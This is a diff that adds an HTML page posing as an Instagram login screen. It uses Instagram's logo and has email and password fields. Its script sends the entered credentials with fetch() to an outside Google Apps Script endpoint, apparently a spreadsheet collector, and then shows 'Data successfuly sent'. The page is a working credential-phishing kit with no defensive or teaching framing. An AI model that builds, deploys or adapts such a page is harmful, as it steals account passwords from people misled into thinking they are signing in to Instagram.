@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram security</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE-edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="Login page.css">
+    </head>
+    <body>
+        <section>
+            <div class="login-box">
+                <form class="action" name="submit-to-google-sheet">
+                    <h2><div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yx/r/WtxJZZ3-9ZP.png&quot;); background-position: 0px 0px; background-size: 176px 186px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i></div></h2>
+                    <div class="input-box">
+                        <span class="icon"><i class="fa-solid fa-envelope"></i></span>
+                        <input type="email" required class="input" name="email" placeholder="email" >
+                    </div>
+                    <div class="input-box">
+                        <span class="icon"><i class="fa-solid fa-lock"></i></span>
+                        <input type="password" required class="input" name="password" placeholder="Password">
+                    </div>
+                    <button type="submit" class="submit">Log in</button>
+                    <p style="margin: 30px 95px;"><a href="Forgotpassword.html">Forgot password</a></p>
+                    <span id="success"></span>
+                </form>
+            </div>
+        </section>
+        <section>
+         <div class="register-link">
+          <p style="font-size: 13px;font-weight: 500;">Don't have an account?<a href="youalreadyhaveanaccount.html">Sign up</a></p>
+         </div>
+        </section>
+
+        <script>
+          const scriptURL = 'https://script.google.com/macros/s/AKfycbycXhwyf_wHKbn6PSN0iSgPqQScM66pFsRDJ0hYIIzaI6iRG8Bu9iD2pTl6UWrE_urY0A/exec'
+          const form = document.forms['submit-to-google-sheet']
+          const success = document.getElementById('success');
+          form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+              .then(response => {
+                success.innerHTML="Data successfuly sent";
+
+                setTimeout(function()
+                {
+                    success.innerHTML=""  
+                },5000)
+                form.reset();
+              })
+              .catch(error => console.error('Error!', error.message))
+          })
+    </script>
+    </body>
+</html>
